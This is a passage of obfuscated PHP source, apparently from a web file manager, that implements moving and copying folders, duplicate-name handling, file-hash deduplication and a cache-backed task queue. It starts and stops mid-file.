$øÀ©×´ = array($ÀÄº¤Óí[440] => $¡æÓ²§‰, $ÀÄº¤Óí[439] => $this->targetIsDelete); $µÆøúç = $this->where($øÀ©×´)->select(); $µÆøúç = $µÆøúç ? $µÆøúç : array(); $®³ßšÉä = array_to_keyvalue($µÆøúç, $ÀÄº¤Óí[410]); $this->_childrenListCache[$¡æÓ²§‰] = $®³ßšÉä; foreach ($®³ßšÉä as $¡æÓ²§‰ => $Ë™¸¼×•) { $this->_childrenItemCache[$¡æÓ²§‰] = $Ë™¸¼×•; } return $®³ßšÉä; } private function fileNameExistCache($¡ ÏÚßë, $É¹©ğ¿) { $”ØµÚªÀ =& $_SERVER[™¾ÇÙ¯¹]; $É¹©ğ¿ = strtolower($É¹©ğ¿); $å»×”üê = $this->_childrenList($¡ ÏÚßë); foreach ($å»×”üê as $ØüËÃñ) { if ($É¹©ğ¿ == strtolower($ØüËÃñ[$”ØµÚªÀ[32]])) { return $ØüËÃñ[$”ØµÚªÀ[410]]; } } return !1; } private function fileNameAutoCache($û£ŒÎÙ, $ïïÇ Şó, $ïë²Ì±, $§²¸ı½É) { $ÕÚÚë•¡ =& $_SERVER[™¾ÇÙ¯¹]; $›™îÀ” = $this->_childrenList($û£ŒÎÙ); $ÜÂõñ‡Ù = array_to_keyvalue($›™îÀ”, $ÕÚÚë•¡[12], $ÕÚÚë•¡[32]); return $this->fileNameAutoGet($ÜÂõñ‡Ù, $ïïÇ Şó, $ïë²Ì±, $§²¸ı½É); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($üåÏ…×±, $øÙßìƒ›, $¼ú¸¦’õ = REPEAT_REPLACE, $ŠµÊæ¨ = '') { $à¾Ñ°”° =& $_SERVER[™¾ÇÙ¯¹]; $ ŞøÌÔ = $this->sourceInfo($üåÏ…×±); $¼¼Äâå’ = $this->sourceInfo($øÙßìƒ›); if ($ ŞøÌÔ[$à¾Ñ°”°[440]] == $¼¼Äâå’[$à¾Ñ°”°[410]]) { if ($ ŞøÌÔ[$à¾Ñ°”°[439]] == $à¾Ñ°”°[88]) { Model($à¾Ñ°”°[437])->restore(array($üåÏ…×±)); } if (!$ŠµÊæ¨ || $ŠµÊæ¨ == $ ŞøÌÔ[$à¾Ñ°”°[32]]) { return $üåÏ…×±; } } $¼éó­Àá = $this->pathInfoMore($üåÏ…×±); if ($this->isParentOf($üåÏ…×±, $øÙßìƒ›)) { return !1; } if (!$ ŞøÌÔ || !$¼¼Äâå’ || $¼¼Äâå’[$à¾Ñ°”°[418]] != $à¾Ñ°”°[88]) { return !1; } Hook::trigger($à¾Ñ°”°[604], $¼éó­Àá); $this->targetIsDelete = intval($ ŞøÌÔ[$à¾Ñ°”°[439]]); if ($ ŞøÌÔ[$à¾Ñ°”°[440]] == $øÙßìƒ› && $ŠµÊæ¨ != $ ŞøÌÔ[$à¾Ñ°”°[32]]) { $Öşƒ¯ôŒ = $this->fileNameExist($øÙßìƒ›, $ŠµÊæ¨); if ($Öşƒ¯ôŒ && $ ŞøÌÔ[$à¾Ñ°”°[418]] == $à¾Ñ°”°[197]) { $ùĞ„İú = $this->sourceInfo($Öşƒ¯ôŒ); $ë£ñªøá = $this->fileHistory($ùĞ„İú, $ ŞøÌÔ[$à¾Ñ°”°[476]], $ ŞøÌÔ[$à¾Ñ°”°[76]]); if (!$ë£ñªøá) { Model($à¾Ñ°”°[479])->remove($ ŞøÌÔ[$à¾Ñ°”°[476]]); } $this->removeNow($üåÏ…×±, !1); $this->folderSizeReset($øÙßìƒ›); Hook::trigger($à¾Ñ°”°[605], $¼éó­Àá); return $Öşƒ¯ôŒ; } } $æ¾Îòšë = $ŠµÊæ¨ ? $ŠµÊæ¨ : $ ŞøÌÔ[$à¾Ñ°”°[32]]; $this->lockMoveStart($üåÏ…×±); $this->lockWriteStart($øÙßìƒ›, $æ¾Îòšë); $Î“†¤ÑË = array($à¾Ñ°”°[574] => array(), $à¾Ñ°”°[606] => !1); $this->clearShare($üåÏ…×±, $øÙßìƒ›); $Ü«¼†¬· = $this->fileNameExistCache($øÙßìƒ›, $ ŞøÌÔ[$à¾Ñ°”°[32]]); $Øóİ½ÑÈ = $this->_move($üåÏ…×±, $øÙßìƒ›, $¼ú¸¦’õ, $Î“†¤ÑË, $ŠµÊæ¨); $this->sourceCacheClear(); if ($ ŞøÌÔ[$à¾Ñ°”°[418]] == $à¾Ñ°”°[88] && $Ü«¼†¬·) { $this->folderSizeResetChildren($Øóİ½ÑÈ); } Model($à¾Ñ°”°[199])->linkAdd($Î“†¤ÑË[$à¾Ñ°”°[574]]); if ($Ü«¼†¬· && $Î“†¤ÑË[$à¾Ñ°”°[606]]) { $this->removeNow($üåÏ…×±, !1); } $this->lockMoveEnd($üåÏ…×±); $this->lockWriteEnd($øÙßìƒ›, $æ¾Îòšë); $this->folderSizeReset($ ŞøÌÔ[$à¾Ñ°”°[440]]); $this->folderSizeReset($øÙßìƒ›); $è²çğ×× = array($ ŞøÌÔ[$à¾Ñ°”°[440]], $øÙßìƒ›); if ($ ŞøÌÔ[$à¾Ñ°”°[418]] == $à¾Ñ°”°[88]) { $è²çğ××[] = $üåÏ…×±; } $this->updateModifyTime($è²çğ××); Model($à¾Ñ°”°[578])->eventMove($üåÏ…×±, $ ŞøÌÔ[$à¾Ñ°”°[440]], $øÙßìƒ›); Hook::trigger($à¾Ñ°”°[605], $¼éó­Àá); return $Øóİ½ÑÈ; } private function _move($Æß„ô, $¥Ğ…úáĞ, $ÙÂÓÖÔö, &$È…¬“ïü, $Ÿ¬ş«Ã = '') { $êµ¬®ñ‹ =& $_SERVER[™¾ÇÙ¯¹]; $ƒÉñ¹ê = $this->sourceInfo($Æß„ô); $…†Å¶š° = $ƒÉñ¹ê[$êµ¬®ñ‹[418]] == $êµ¬®ñ‹[88]; $’’§Øşø = $Ÿ¬ş«Ã ? $Ÿ¬ş«Ã : $ƒÉñ¹ê[$êµ¬®ñ‹[32]]; $şÕ‰¾ˆÓ = $this->fileNameExistCache($¥Ğ…úáĞ, $’’§Øşø); $this->lockMoveStart($Æß„ô); $this->lockWriteStart($¥Ğ…úáĞ, $’’§Øşø); if (!$şÕ‰¾ˆÓ) { return $this->_moveForce($Æß„ô, $¥Ğ…úáĞ, $’’§Øşø); } $ğÆäÜè¯ = $şÕ‰¾ˆÓ; $¬ç…ñË = !1; if ($…†Å¶š°) { if ($ÙÂÓÖÔö == REPEAT_RENAME_FOLDER) { $’’§Øşø = $this->fileNameAuto($¥Ğ…úáĞ, $’’§Øşø, $ÙÂÓÖÔö, $…†Å¶š°); $ğÆäÜè¯ = $this->_moveForce($Æß„ô, $¥Ğ…úáĞ, $’’§Øşø); } else { if ($ÙÂÓÖÔö == REPEAT_RENAME_FOLDER) { $ÙÂÓÖÔö = REPEAT_RENAME; } $¯ıÃº = $this->_childrenListSelect($Æß„ô); foreach ($¯ıÃº as $Ø‡““ÎÛ) { $this->_move($Ø‡““ÎÛ[$êµ¬®ñ‹[410]], $şÕ‰¾ˆÓ, $ÙÂÓÖÔö, $È…¬“ïü); } $¬ç…ñË = !0; } } else { if ($ÙÂÓÖÔö == REPEAT_SKIP) { $¬ç…ñË = !0; } else { if ($ÙÂÓÖÔö == REPEAT_RENAME || $ÙÂÓÖÔö == REPEAT_RENAME_FOLDER) { $’’§Øşø = $this->fileNameAuto($¥Ğ…úáĞ, $’’§Øşø, $ÙÂÓÖÔö, $…†Å¶š°); $ğÆäÜè¯ = $this->_moveForce($Æß„ô, $¥Ğ…úáĞ, $’’§Øşø); } else { if ($ÙÂÓÖÔö == REPEAT_REPLACE) { $ŸçŸÎÃ = $this->sourceInfoCache($şÕ‰¾ˆÓ); $ÌáÈÁÂï = $this->fileHistory($ŸçŸÎÃ, $ƒÉñ¹ê[$êµ¬®ñ‹[476]], $ƒÉñ¹ê[$êµ¬®ñ‹[76]]); $¬ç…ñË = !0; if ($ÌáÈÁÂï) { $È…¬“ïü[$êµ¬®ñ‹[574]][] = $ƒÉñ¹ê[$êµ¬®ñ‹[476]]; } } } } } if ($¬ç…ñË && !$È…¬“ïü[$êµ¬®ñ‹[606]]) { $È…¬“ïü[$êµ¬®ñ‹[606]] = !0; } return $ğÆäÜè¯; } private function _moveForce($ëÚ”€’ì, $ƒå‚ÄêÁ, $î®íÜçû) { $²õ€Á‚­ =& $_SERVER[™¾ÇÙ¯¹]; $ê¢à§• = $this->sourceInfo($ëÚ”€’ì); $œÍÉÔÕ = $this->sourceInfo($ƒå‚ÄêÁ); $ÉùÓ¡Ëô = $ê¢à§•[$²õ€Á‚­[418]] == $²õ€Á‚­[88]; $Ó×Ëäç¢ = array($²õ€Á‚­[409] => $œÍÉÔÕ[$²õ€Á‚­[410]], $²õ€Á‚­[598] => $œÍÉÔÕ[$²õ€Á‚­[529]] . $œÍÉÔÕ[$²õ€Á‚­[410]] . $²õ€Á‚­[50], $²õ€Á‚­[594] => $œÍÉÔÕ[$²õ€Á‚­[419]], $²õ€Á‚­[595] => $œÍÉÔÕ[$²õ€Á‚­[513]], $²õ€Á‚­[597] => USER_ID, $²õ€Á‚­[428] => $î®íÜçû); $¤ŒØé¢² = $ê¢à§•[$²õ€Á‚­[419]] == SourceModel::TYPE_GROUP && $œÍÉÔÕ[$²õ€Á‚­[419]] == SourceModel::TYPE_GROUP && $ê¢à§•[$²õ€Á‚­[513]] == $œÍÉÔÕ[$²õ€Á‚­[513]]; if (!$¤ŒØé¢² && $this->moveClearAuth) { Model($²õ€Á‚­[510])->authClear($ëÚ”€’ì); } $µñõÊé§ = $ê¢à§•[$²õ€Á‚­[439]] == $²õ€Á‚­[88] && $œÍÉÔÕ[$²õ€Á‚­[439]] != $²õ€Á‚­[88]; if ($µñõÊé§) { $Ó×Ëäç¢[$²õ€Á‚­[438]] = 0; } if ($ÉùÓ¡Ëô) { $×ğÀŞì = array($²õ€Á‚­[598] => array($²õ€Á‚­[558], $ê¢à§•[$²õ€Á‚­[529]] . $ê¢à§•[$²õ€Á‚­[410]] . $²õ€Á‚­[559])); $ı½“Ë˜ = $ê¢à§•[$²õ€Á‚­[529]] . $ê¢à§•[$²õ€Á‚­[410]] . $²õ€Á‚­[50]; $‚“¸æÄÈ = $œÍÉÔÕ[$²õ€Á‚­[529]] . $œÍÉÔÕ[$²õ€Á‚­[410]] . $²õ€Á‚­[50] . $ê¢à§•[$²õ€Á‚­[410]] . $²õ€Á‚­[50]; $ÊÎÍ¼÷ı = array($²õ€Á‚­[598] => array($²õ€Á‚­[607], "\162\145\x70\154\141\143\145\50\160\141\162\145\x6e\164\114\x65\x76\145\x6c\x2c\x27{$ı½“Ë˜}\x27\x2c\47{$‚“¸æÄÈ}\x27\x29"), $²õ€Á‚­[594] => $œÍÉÔÕ[$²õ€Á‚­[419]], $²õ€Á‚­[595] => $œÍÉÔÕ[$²õ€Á‚­[513]]); if ($µñõÊé§) { $ÊÎÍ¼÷ı[$²õ€Á‚­[438]] = 0; } $this->where($×ğÀŞì)->data($ÊÎÍ¼÷ı)->save(); } $this->where(array($²õ€Á‚­[425] => $ëÚ”€’ì))->data($Ó×Ëäç¢)->save(); return $ëÚ”€’ì; } private function clearShare($ûıë öœ, $ÏÚü¡¡±) { $¦¬çòµé =& $_SERVER[™¾ÇÙ¯¹]; $Ÿ¿¤¾Œ = $this->sourceInfo($ûıë öœ); $Â‡şÜÅŸ = $this->sourceInfo($ÏÚü¡¡±); if ($Ÿ¿¤¾Œ[$¦¬çòµé[513]] == $Â‡şÜÅŸ[$¦¬çòµé[513]] && $Ÿ¿¤¾Œ[$¦¬çòµé[419]] == $¦¬çòµé[608]) { return; } $ˆÑÊòµ¶ = array($¦¬çòµé[529] => array($¦¬çòµé[558], $Ÿ¿¤¾Œ[$¦¬çòµé[529]] . $ûıë öœ . $¦¬çòµé[559])); $€Úñ‚Ö´ = $this->field($¦¬çòµé[425])->where($ˆÑÊòµ¶)->getField($¦¬çòµé[410], !0); if (!$€Úñ‚Ö´) { return; } $ˆÑÊòµ¶ = array($¦¬çòµé[410] => array($¦¬çòµé[7], $€Úñ‚Ö´), $¦¬çòµé[504] => 1); $½“—ì°» = Model($¦¬çòµé[609])->field($¦¬çòµé[497])->where($ˆÑÊòµ¶)->select(); if (!$½“—ì°») { return; } $½“—ì°» = array_to_keyvalue($½“—ì°», $¦¬çòµé[12], $¦¬çòµé[497]); $ˆÑÊòµ¶ = array($¦¬çòµé[497] => array($¦¬çòµé[7], $½“—ì°»)); Model($¦¬çòµé[609])->where($ˆÑÊòµ¶)->save(array($¦¬çòµé[504] => 0)); Model($¦¬çòµé[610])->where($ˆÑÊòµ¶)->delete(); } public function copyFolderFromIO($­š¾œ§Ë, $¬É÷Ùé´, $…ƒÁüŞ¡, $’á´ş‹¥, $Ä–Œßãª, $€Û…ã¶º = false) { $â”—ıÌ© =& $_SERVER[™¾ÇÙ¯¹]; $ë˜Ë°äÌ = array($â”—ıÌ©[575] => array(), $â”—ıÌ©[576] => array(), $â”—ıÌ©[574] => array(), $â”—ıÌ©[611] => array()); $ÓæìØ Œ = $€Û…ã¶º ? $€Û…ã¶º : $­š¾œ§Ë->pathThis($¬É÷Ùé´); $×Â»¬İ = $this->fileNameExist($…ƒÁüŞ¡, $ÓæìØ Œ); $ò´Óú = $this->mkdir($…ƒÁüŞ¡, $ÓæìØ Œ, $’á´ş‹¥); if (!$×Â»¬İ || $’á´ş‹¥ == REPEAT_RENAME_FOLDER) { $’á´ş‹¥ = !1; } if ($×Â»¬İ) { $this->_childrenAllMake($×Â»¬İ); } Hook::trigger($â”—ıÌ©[612]); $this->_copyChildTo($­š¾œ§Ë, $¬É÷Ùé´, $ò´Óú, $’á´ş‹¥, $ë˜Ë°äÌ, $Ä–Œßãª); Hook::trigger($â”—ıÌ©[613]); if ($ò´Óú) { $this->folderSizeResetChildren($ò´Óú); } $this->_childrenListClear(); Model($â”—ıÌ©[577])->addAll($ë˜Ë°äÌ[$â”—ıÌ©[575]], array(), !0); Model($â”—ıÌ©[578])->eventCopy($ò´Óú); $this->saveAll($ë˜Ë°äÌ[$â”—ıÌ©[576]]); Model($â”—ıÌ©[479])->linkAdd($ë˜Ë°äÌ[$â”—ıÌ©[574]]); Model($â”—ıÌ©[479])->remove($ë˜Ë°äÌ[$â”—ıÌ©[611]]); $this->folderSizeReset($…ƒÁüŞ¡); $this->updateModifyTime($…ƒÁüŞ¡); return $ò´Óú; } private function _copyChildTo($äš€‡õÅ, $ĞªÅĞŒ™, $Õº¥¼¯Ì, $’ƒûš†‹, &$î¨¥Êİ­, $ÇäèŠµÍ) { $ÕØî±æ… =& $_SERVER[™¾ÇÙ¯¹]; $È€ú‰³‡ = $this->sourceInfoCache($Õº¥¼¯Ì); $£¹úëÀ = $äš€‡õÅ->listPath($ĞªÅĞŒ™); $£¹úëÀ = $£¹úëÀ ? $£¹úëÀ : array($ÕØî±æ…[83] => array(), $ÕØî±æ…[82] => array()); $§Ûì·Úä = array_merge($£¹úëÀ[$ÕØî±æ…[83]], $£¹úëÀ[$ÕØî±æ…[82]]); $ÑúÂÂÕ = $this->_addFiles($äš€‡õÅ, $£¹úëÀ[$ÕØî±æ…[83]], $ÇäèŠµÍ); $é±·‡ = array(); foreach ($§Ûì·Úä as &$œ¤ú‘îÉ) { if (isset($ÑúÂÂÕ[$œ¤ú‘îÉ[$ÕØî±æ…[32]]])) { $œ¤ú‘îÉ = $ÑúÂÂÕ[$œ¤ú‘îÉ[$ÕØî±æ…[32]]]; } $œ¤ú‘îÉ[$ÕØî±æ…[418]] = $œ¤ú‘îÉ[$ÕØî±æ…[33]] == $ÕØî±æ…[75]; $œ¤ú‘îÉ[$ÕØî±æ…[420]] = substr(_get($œ¤ú‘îÉ, $ÕØî±æ…[174], $ÕØî±æ…[12]), 0, 10); $œ¤ú‘îÉ[$ÕØî±æ…[76]] = _get($œ¤ú‘îÉ, $ÕØî±æ…[76], 0); $œ¤ú‘îÉ[$ÕØî±æ…[476]] = _get($œ¤ú‘îÉ, $ÕØî±æ…[476], 0); if (!isset($œ¤ú‘îÉ[$ÕØî±æ…[614]]) && $œ¤ú‘îÉ[$ÕØî±æ…[476]]) { $î¨¥Êİ­[$ÕØî±æ…[611]][] = $œ¤ú‘îÉ[$ÕØî±æ…[476]]; } if ($’ƒûš†‹) { $ ·©Ù£ = $this->fileNameExistCache($Õº¥¼¯Ì, $œ¤ú‘îÉ[$ÕØî±æ…[32]]); if ($ ·©Ù£) { if ($œ¤ú‘îÉ[$ÕØî±æ…[418]] || $’ƒûš†‹ == REPEAT_SKIP) { continue; } if ($’ƒûš†‹ == REPEAT_REPLACE) { $‡ÓÈÖİ– = $this->sourceInfoCache($ ·©Ù£); $ÀÌºµÁœ = $this->fileHistory($‡ÓÈÖİ–, $œ¤ú‘îÉ[$ÕØî±æ…[476]], $œ¤ú‘îÉ[$ÕØî±æ…[76]]); if ($ÀÌºµÁœ) { $î¨¥Êİ­[$ÕØî±æ…[574]][] = $œ¤ú‘îÉ[$ÕØî±æ…[476]]; } continue; } else { if ($’ƒûš†‹ == REPEAT_RENAME) { $œ¤ú‘îÉ[$ÕØî±æ…[32]] = $this->fileNameAutoCache($Õº¥¼¯Ì, $œ¤ú‘îÉ[$ÕØî±æ…[32]], $’ƒûš†‹, !1); } } } } if (!$œ¤ú‘îÉ[$ÕØî±æ…[418]] && $œ¤ú‘îÉ[$ÕØî±æ…[476]] == 0) { continue; } if (!$œ¤ú‘îÉ[$ÕØî±æ…[418]] && $œ¤ú‘îÉ[$ÕØî±æ…[476]]) { $î¨¥Êİ­[$ÕØî±æ…[574]][] = $œ¤ú‘îÉ[$ÕØî±æ…[476]]; } $é±·‡[] = $this->_makeItemData($œ¤ú‘îÉ, $È€ú‰³‡, $œ¤ú‘îÉ[$ÕØî±æ…[32]]); } unset($œ¤ú‘îÉ); if (!empty($é±·‡)) { $this->addAll($é±·‡); $this->_childrenListSelect($Õº¥¼¯Ì); } $¸×®¾ºÒ = $this->_childrenList($Õº¥¼¯Ì); $¸×®¾ºÒ = array_to_keyvalue($¸×®¾ºÒ, $ÕØî±æ…[32]); foreach ($§Ûì·Úä as $œ¤ú‘îÉ) { $‡ÓÈÖİ– = $¸×®¾ºÒ[$œ¤ú‘îÉ[$ÕØî±æ…[32]]]; $ÂñóŞ»™ = $‡ÓÈÖİ–[$ÕØî±æ…[410]]; $this->_copyApplyMeta($‡ÓÈÖİ–, $î¨¥Êİ­); if ($œ¤ú‘îÉ[$ÕØî±æ…[33]] == $ÕØî±æ…[75]) { $œ¤ú‘îÉ[$ÕØî±æ…[84]] = $äš€‡õÅ->getPathInner($œ¤ú‘îÉ[$ÕØî±æ…[84]]); $this->_copyChildTo($äš€‡õÅ, $œ¤ú‘îÉ[$ÕØî±æ…[84]], $ÂñóŞ»™, $’ƒûš†‹, $î¨¥Êİ­, $ÇäèŠµÍ); } } } private function _addFiles($á¹ıñ¦Ş, $ò¼á¶¥Ô, $ˆ…’Ïğé) { $–ÕçÏ‹Ú =& $_SERVER[™¾ÇÙ¯¹]; if (!$ò¼á¶¥Ô || count($ò¼á¶¥Ô) == 0) { return array(); } $±ŒŸšôç = array(); foreach ($ò¼á¶¥Ô as &$Š˜‡¯¢Å) { Hook::trigger($–ÕçÏ‹Ú[615], $Š˜‡¯¢Å); $Š˜‡¯¢Å[$–ÕçÏ‹Ú[84]] = $á¹ıñ¦Ş->getPathInner($Š˜‡¯¢Å[$–ÕçÏ‹Ú[84]]); $±šÎâŠß = $á¹ıñ¦Ş->hashSimple($Š˜‡¯¢Å[$–ÕçÏ‹Ú[84]]); $¯˜ãìÂº = $á¹ıñ¦Ş->hashMd5($Š˜‡¯¢Å[$–ÕçÏ‹Ú[84]]); if (strlen($¯˜ãìÂº) > 10 && !isset($±ŒŸšôç[$¯˜ãìÂº])) { $±ŒŸšôç[$¯˜ãìÂº] = array(); } $Š˜‡¯¢Å[$–ÕçÏ‹Ú[177]] = $±šÎâŠß; $Š˜‡¯¢Å[$–ÕçÏ‹Ú[176]] = $¯˜ãìÂº; $±ŒŸšôç[$¯˜ãìÂº][] =& $Š˜‡¯¢Å; if (count($±ŒŸšôç[$¯˜ãìÂº]) > 1) { $Š˜‡¯¢Å[$–ÕçÏ‹Ú[614]] = !0; } Hook::trigger($–ÕçÏ‹Ú[616], $Š˜‡¯¢Å); } unset($Š˜‡¯¢Å); $Òşè® = array($–ÕçÏ‹Ú[176] => array($–ÕçÏ‹Ú[7], array_keys($±ŒŸšôç))); $æœ¹ÁÄ = Model($–ÕçÏ‹Ú[617]); $ºïŞ®Ö† = $æœ¹ÁÄ->where($Òşè®)->select(); $ºïŞ®Ö† = $ºïŞ®Ö† ? $ºïŞ®Ö† : array(); foreach ($ºïŞ®Ö† as $ŒïÆ¿İ¡) { if (!isset($±ŒŸšôç[$ŒïÆ¿İ¡[$–ÕçÏ‹Ú[176]]])) { continue; } $¨ãı·ù = $±ŒŸšôç[$ŒïÆ¿İ¡[$–ÕçÏ‹Ú[176]]]; foreach ($¨ãı·ù as &$Š˜‡¯¢Å) { $Š˜‡¯¢Å[$–ÕçÏ‹Ú[476]] = $ŒïÆ¿İ¡[$–ÕçÏ‹Ú[476]]; $Š˜‡¯¢Å[$–ÕçÏ‹Ú[614]] = !0; } unset($Š˜‡¯¢Å); } $‚úÃ¤Æ = array(); foreach ($ò¼á¶¥Ô as $×•Æœ¯Ê) { Hook::trigger($–ÕçÏ‹Ú[618], $×•Æœ¯Ê); if (isset($×•Æœ¯Ê[$–ÕçÏ‹Ú[614]]) && $×•Æœ¯Ê[$–ÕçÏ‹Ú[614]]) { Hook::trigger($–ÕçÏ‹Ú[619], $×•Æœ¯Ê); continue; } $ÓÃˆ¯æØ = $á¹ıñ¦Ş->getPathInner($×•Æœ¯Ê[$–ÕçÏ‹Ú[84]]); $„°ø‚í = $æœ¹ÁÄ->addFileMake($ÓÃˆ¯æØ, $×•Æœ¯Ê[$–ÕçÏ‹Ú[76]], $×•Æœ¯Ê[$–ÕçÏ‹Ú[177]], $×•Æœ¯Ê[$–ÕçÏ‹Ú[176]], $×•Æœ¯Ê[$–ÕçÏ‹Ú[32]], $ˆ…’Ïğé); Hook::trigger($–ÕçÏ‹Ú[619], $×•Æœ¯Ê); if (!is_array($„°ø‚í)) { continue; } $‚úÃ¤Æ[] = $„°ø‚í; } $æœ¹ÁÄ->addAll($‚úÃ¤Æ); $Òşè® = array($–ÕçÏ‹Ú[176] => array($–ÕçÏ‹Ú[7], array_keys($±ŒŸšôç))); $ºïŞ®Ö† = $æœ¹ÁÄ->where($Òşè®)->select(); $ºïŞ®Ö† = $ºïŞ®Ö† ? $ºïŞ®Ö† : array(); foreach ($ºïŞ®Ö† as $ŒïÆ¿İ¡) { if (!isset($±ŒŸšôç[$ŒïÆ¿İ¡[$–ÕçÏ‹Ú[176]]])) { continue; } $úòîâà =& $±ŒŸšôç[$ŒïÆ¿İ¡[$–ÕçÏ‹Ú[176]]]; foreach ($úòîâà as &$Š˜‡¯¢Å) { $Š˜‡¯¢Å[$–ÕçÏ‹Ú[476]] = $ŒïÆ¿İ¡[$–ÕçÏ‹Ú[476]]; } unset($Š˜‡¯¢Å); } $©œÚ¼Ê¸ = array(); foreach ($ò¼á¶¥Ô as $—’Óú÷ü) { $©œÚ¼Ê¸[$—’Óú÷ü[$–ÕçÏ‹Ú[32]]] = $—’Óú÷ü; } return $©œÚ¼Ê¸; } } define($_SERVER[™¾ÇÙ¯¹][620], $_SERVER[™¾ÇÙ¯¹][621]); $pacvhktgze = $_SERVER[™¾ÇÙ¯¹][622]; goto føŒ Ù½Â; b÷‹òÉ¼‰: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\145\x75\145\114\x65\156\x67\x74\150"; const QUEUE_DATA = "\164\141\163\153\x51\165\x65\x75\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($Ù×†ÊÄÁ, $»´Ì¼®ô = array(), $¿•îŸí² = '', $”ºÈË¶ = '') { $û‰Çò¨ã =& $_SERVER[™¾ÇÙ¯¹]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($”ºÈË¶ && array_find_by_field(self::$listData, $û‰Çò¨ã[94], $”ºÈË¶)) { return !0; } self::$listData[] = array($û‰Çò¨ã[273] => $Ù×†ÊÄÁ, $û‰Çò¨ã[1746] => $»´Ì¼®ô, $û‰Çò¨ã[461] => $¿•îŸí², $û‰Çò¨ã[94] => $”ºÈË¶); return !0; } public static function addSubmit() { $¯™µ‚¢Ğ =& $_SERVER[™¾ÇÙ¯¹]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($¯™µ‚¢Ğ[1747] . json_encode_force(array_to_keyvalue(self::$listData, $¯™µ‚¢Ğ[12], $¯™µ‚¢Ğ[461])), $¯™µ‚¢Ğ[1748]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($¶–‹£µ , $ÖÌ¯•× = array(), $çıÇ¨õ„ = '', $°“ê¹ØÅ = '') { $ç˜ÎÙÔ =& $_SERVER[™¾ÇÙ¯¹]; if (self::count() >= self::MAX_LENGTH) { return !1; } $™¸û¥Û‚ = self::getAll(); if ($°“ê¹ØÅ && array_find_by_field($™¸û¥Û‚, $ç˜ÎÙÔ[94], $°“ê¹ØÅ)) { return !0; } $™¸û¥Û‚[] = array($ç˜ÎÙÔ[273] => $¶–‹£µ , $ç˜ÎÙÔ[1746] => $ÖÌ¯•×, $ç˜ÎÙÔ[461] => $çıÇ¨õ„, $ç˜ÎÙÔ[94] => $°“ê¹ØÅ); write_log($ç˜ÎÙÔ[1747] . $çıÇ¨õ„, $ç˜ÎÙÔ[1748]); self::setAll($™¸û¥Û‚); return !0; } public static function run() { $äª¦¬Œ =& $_SERVER[™¾ÇÙ¯¹]; $€ûôí = self::getAll(); $¼¨ÉÄ—« = array_shift($€ûôí); if (!$¼¨ÉÄ—«) { return !1; } self::setAll($€ûôí); $ƒ§ı¨äˆ = timeFloat(); try { Hook::apply($¼¨ÉÄ—«[$äª¦¬Œ[273]], $¼¨ÉÄ—«[$äª¦¬Œ[1746]]); } catch (Exception $©§›à ‘) { } $—ì¼Şéˆ = number_format(timeFloat() - $ƒ§ı¨äˆ, 3) . $äª¦¬Œ[1681]; write_log($äª¦¬Œ[1749] . $¼¨ÉÄ—«[$äª¦¬Œ[461]] . $äª¦¬Œ[1750] . $—ì¼Şéˆ, $äª¦¬Œ[1748]); return !0; } public static function count() { $öû†™Øñ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$öû†™Øñ) { return 0; } return intval($öû†™Øñ); } public static function getAll() { $©ÁçŸËÈ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$©ÁçŸËÈ) { return array(); } return $©ÁçŸËÈ; } public static function setAll($íÚÅÉ§Å) { $…ş„¢ï¿ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($íÚÅÉ§Å), $…ş„¢ï¿); Cache::set(self::QUEUE_DATA, $íÚÅÉ§Å, $…ş„¢ï¿); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ßó­©«ë, $üş¢¸ = 5.0) { if (!$ßó­©«ë) { return; } $‘òëÚÎ› = Cache::get($ßó­©«ë); if (!$‘òëÚÎ› || timeFloat() - floatVal($‘òëÚÎ›) >= $üş¢¸) { Cache::set($ßó­©«ë, timeFloat(), $üş¢¸ * 10); return !0; } return !1; } public static function timeLimitCall($Å¯É’â­, $¤¬–¤ŠŞ, $¤àçé§¯, $²ŸÚÔË° = 5.0) { $ÜŠáéŠŞ =& $_SERVER[™¾ÇÙ¯¹]; if (!$Å¯É’â­ || !$¤¬–¤ŠŞ) { return; } self::$asyncAdd = !0; $õ­Æşö¹ = $ÜŠáéŠŞ[1751]; $¦…ı¿‘ = Cache::get($õ­Æşö¹, !0); $ôùüŸ› = array($ÜŠáéŠŞ[1752] => timeFloat(), $ÜŠáéŠŞ[1753] => timeFloat(), $ÜŠáéŠŞ[273] => $¤¬–¤ŠŞ, $ÜŠáéŠŞ[1746] => $¤àçé§¯, $ÜŠáéŠŞ[203] => $²ŸÚÔË°); if (is_array($¦…ı¿‘[$Å¯É’â­])) { $ôùüŸ›[$ÜŠáéŠŞ[1753]] = $¦…ı¿‘[$Å¯É’â­][$ÜŠáéŠŞ[1753]]; } if (is_array($¦…ı¿‘[$Å¯É’â­])) { if (timeFloat() - $¦…ı¿‘[$Å¯É’â­][$ÜŠáéŠŞ[1752]] < $ôùüŸ›[$ÜŠáéŠŞ[203]] * 0.3) { return; } $ôùüŸ›[$ÜŠáéŠŞ[1753]] = $¦…ı¿‘[$Å¯É’â­][$ÜŠáéŠŞ[1753]]; } $¦…ı¿‘[$Å¯É’â­] = $ôùüŸ›; Cache::set($õ­Æşö¹, $¦…ı¿‘, 60); Cache::removeMemory($õ­Æşö¹); write_log($ÜŠáéŠŞ[1754] . $Å¯É’â­ . $ÜŠáéŠŞ[71] . $¤¬–¤ŠŞ, $ÜŠáéŠŞ[1748]); } public static function timeLimitCallLoop() { $”á–‰û¶ =& $_SERVER[™¾ÇÙ¯¹]; $Ææß—Èç = array($”á–‰û¶[1755]); $ÛÔÈáµğ = in_array(strtolower(ACTION), $Ææß—Èç); if (!$ÛÔÈáµğ && !self::$asyncAdd) { return; } $’¥Ààá = $”á–‰û¶[1751]; $óêš§Áì = 